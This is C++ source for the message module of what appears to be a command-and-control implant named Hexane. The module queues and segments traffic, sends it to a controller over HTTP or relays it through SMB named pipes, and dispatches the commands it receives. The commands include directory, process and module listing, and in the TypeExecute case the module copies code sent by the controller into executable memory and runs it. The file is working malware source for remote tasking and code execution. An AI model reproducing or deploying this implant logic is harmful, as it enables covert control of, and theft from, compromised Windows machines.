#include <core/include/message.hpp>
namespace Message {

    BOOL PeekPID(PSTREAM Stream) {
        HEXANE
        UINT Pid = 0;

        x_memcpy(&Pid, Stream->Buffer, 4);
        if (x_memcmp(&Ctx->Session.PeerId, &Pid, 4) == 0) {
            return TRUE;
        }

        return FALSE;
    }

    VOID AddMessage(PSTREAM Outbound) {
        HEXANE
        PSTREAM Head = Ctx->Transport.OutboundQueue;

        if (!Ctx->Transport.OutboundQueue) {
            Ctx->Transport.OutboundQueue = Outbound;
        } else {
            while (Head->Next) {
                Head = Head->Next;
            }

            Head->Next = Outbound;
        }
    }

    VOID ClearQueue() {
        HEXANE

        PSTREAM Head = Ctx->Transport.OutboundQueue;
        PSTREAM Swap = { };
        PSTREAM Prev = { };

        if (!Head) {
            Ctx->Transport.OutboundQueue = nullptr;
            return;
        }

        while (Head) {
            if (Head->Ready) {
                if (Prev) {
                    Prev->Next = Head->Next;

                } else {
                    Ctx->Transport.OutboundQueue = Head->Next;
                }

                Swap = Head;
                Head = Head->Next;
                Stream::DestroyStream(Swap);

            } else {
                Prev = Head;
                Head = Head->Next;
            }
        }
    }

    VOID OutboundQueue(PSTREAM Outbound) {
        HEXANE

        PARSER Parser   = { };
        PSTREAM Queue   = { };

        if (!Outbound) {
            return_defer(ERROR_NO_DATA);
        }

        if (Outbound->Length > MESSAGE_MAX) {
            QueueSegments(S_CAST(PBYTE, Outbound->Buffer), Outbound->Length);

        } else {
            Parser::CreateParser(&Parser, S_CAST(PBYTE, Outbound->Buffer), Outbound->Length);

            Queue           = Stream::CreateStream();
            Queue->PeerId   = __bswapd(S_CAST(ULONG, Parser::UnpackDword(&Parser)));
            Queue->TaskId   = __bswapd(S_CAST(ULONG, Parser::UnpackDword(&Parser)));
            Queue->MsgType  = __bswapd(S_CAST(ULONG, Parser::UnpackDword(&Parser)));

            Queue->Length   = Parser.Length;
            Queue->Buffer   = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Queue->Buffer, Queue->Length);

            x_memcpy(Queue->Buffer, Parser.Buffer, Queue->Length);
            AddMessage(Queue);

            Parser::DestroyParser(&Parser);
            Stream::DestroyStream(Outbound);
        }

        defer:
    }

    VOID QueueSegments(byte *buffer, uint32_t length) {
        HEXANE

        PSTREAM entry = { };

        uint32_t offset     = 0;
        uint32_t peer_id    = 0;
        uint32_t task_id    = 0;
        uint32_t cb_seg     = 0;
        uint32_t index      = 1;
        uint32_t n_seg      = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;

        while (length > 0) {
            cb_seg = length > MESSAGE_MAX - SEGMENT_HEADER_SIZE
                ? MESSAGE_MAX - SEGMENT_HEADER_SIZE
                : length;

            entry = S_CAST(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cb_seg + SEGMENT_HEADER_SIZE));

            x_memcpy(&peer_id, buffer, 4);
            x_memcpy(&task_id, buffer + 4, 4);

            entry->PeerId    = peer_id;
            entry->TaskId    = task_id;
            entry->MsgType   = TypeSegment;

            Stream::PackDword(entry, index);
            Stream::PackDword(entry, n_seg);
            Stream::PackDword(entry, cb_seg);
            Stream::PackBytes(entry, B_PTR(buffer) + offset, cb_seg);

            index++;
            length -= cb_seg;
            offset += cb_seg;

            AddMessage(entry);
        }
    }

    VOID MessageTransmit() {
        HEXANE

        PSTREAM out     = Stream::CreateStream();
        PSTREAM in      = { };
        PSTREAM head    = { };
        PSTREAM swap    = { };
        PARSER parser   = { };

        retry:

        if (!Ctx->Transport.OutboundQueue) {
#ifdef TRANSPORT_SMB
            return_defer(ERROR_SUCCESS);
#elifdef TRANSPORT_HTTP
            PSTREAM entry = Stream::CreateStreamWithHeaders(TypeTasking);

            OutboundQueue(entry);
            goto retry;
#endif
        } else {
            head = Ctx->Transport.OutboundQueue;
            while (head) {
                if (!head->Ready) {

                    if (head->Length + MESSAGE_HEADER_SIZE + out->Length > MESSAGE_MAX) {
                        break;
                    }
                    if (head->Buffer) {
                        Parser::CreateParser(&parser, B_PTR(head->Buffer), head->Length);

                        Stream::PackDword(out, head->PeerId);
                        Stream::PackDword(out, head->TaskId);
                        Stream::PackDword(out, head->MsgType);

                        if (Ctx->Root) {
                            Stream::PackBytes(out, B_PTR(head->Buffer), head->Length);

                        } else {
                            out->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, out->Buffer, out->Length + head->Length);
                            x_memcpy(B_PTR(out->Buffer) + out->Length, head->Buffer, head->Length);

                            out->Length += head->Length;
                        }
                    } else {
                        return_defer(ERROR_NO_DATA);
                    }
                    head->Ready = TRUE;
                }
                head = head->Next;
            }
        }

#ifdef TRANSPORT_HTTP
        Http::HttpCallback(out, &in);
#endif
#ifdef TRANSPORT_PIPE
        Smb::PeerConnectEgress(out, &in);
#endif
        Stream::DestroyStream(out);
        out = nullptr;

        if (in) {
            ClearQueue();

            if (PeekPID(in)) {
                CommandDispatch(in);
                Stream::DestroyStream(in);

            } else {
                swap = in;
                in = out;
                out = swap;

                if (Ctx->Config.IngressPipename) {
                    Smb::PeerConnectIngress(out, &in);

                    if (in) {
                        OutboundQueue(in);
                    }
                }
                Stream::DestroyStream(out);
            }
        } else {
            head = Ctx->Transport.OutboundQueue;
            while (head) {
                head->Ready = FALSE;
                head = head->Next;
            }
        }

    defer:
    }

    RDATA_SECTION COMMAND_MAP cmd_map[] = {
        {.Id = CommandDir,          .Function = Commands::DirectoryList},
        {.Id = CommandMods,         .Function = Commands::ProcessModules},
        {.Id = CommandProcess,      .Function = Commands::ProcessList},
        {.Id = CommandUpdatePeer,   .Function = Commands::UpdatePeer},
        {.Id = CommandShutdown,     .Function = Commands::Shutdown},
        {.Id = 0,                   .Function = nullptr}
    };

    VOID CommandDispatch (PSTREAM in) {
        HEXANE

        PARSER parser   = { };
        ULONG msg_type  = 0;

        Parser::CreateParser(&parser, B_PTR(in->Buffer), in->Length);
        Parser::UnpackDword(&parser); // throw-away peer id

        Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&parser);
        msg_type = Parser::UnpackDword(&parser);

        switch (msg_type) {

            case TypeCheckin: {
                Ctx->Session.Checkin = TRUE;
                break;
            }

            case TypeTasking: {
                auto cmd_id = Parser::UnpackDword(&parser);
                if (cmd_id == CommandNoJob) {
                    break;
                }

                for (uint32_t i = 0 ;; i++) {
                    if (!cmd_map[i].Function) {
                        return_defer(ERROR_PROC_NOT_FOUND);
                    }

                    if (cmd_map[i].Id == cmd_id) {
                        const auto cmd = R_CAST(CmdSignature, Ctx->Base.Address + U_PTR(cmd_map[i].Function));
                        cmd(&parser);
                        break;
                    }
                }
            }

            case TypeExecute: {
                void *exec  = { };
                size_t size = parser.Length;

                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                    return_defer(ntstatus);
                }

                x_memcpy(exec, parser.Buffer, parser.Length);
                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &exec, &size, PAGE_EXECUTE_READ, nullptr))) {
                    return_defer(ntstatus);
                }

                auto (*cmd)(PPARSER) = R_CAST(VOID (*)(PPARSER), exec);
                cmd(&parser);

                x_memset(exec, 0, size);

                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &exec, &size, MEM_FREE))) {
                    return_defer(ntstatus);
                }
            }

            default:
                break;
        }

        defer:
        Parser::DestroyParser(&parser);
    }
}
